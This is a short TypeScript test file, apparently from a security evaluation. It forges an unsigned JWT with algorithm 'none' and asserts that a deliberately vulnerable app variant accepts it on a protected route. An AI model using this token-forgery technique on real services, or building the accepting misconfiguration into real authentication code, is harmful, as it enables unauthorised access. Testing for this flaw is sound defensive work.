import jwt from 'jsonwebtoken';
import request from 'supertest';
import { loadVariantApp } from '../load-variant-app';

const app = loadVariantApp();

describe('JWT algorithm misconfiguration exploit', () => {
  it('accepts unsigned alg=none token', async () => {
    const token = jwt.sign({ userId: 'user-123' }, null as any, {
      algorithm: 'none',
      expiresIn: '1h',
      audience: 'api-auth-eval',
      issuer: 'api-auth-service',
    });

    const res = await request(app).get('/jwt/protected').set('Authorization', `Bearer ${token}`);

    expect(res.status).toBe(200);
    expect(res.body.userId).toBe('user-123');
  });
});
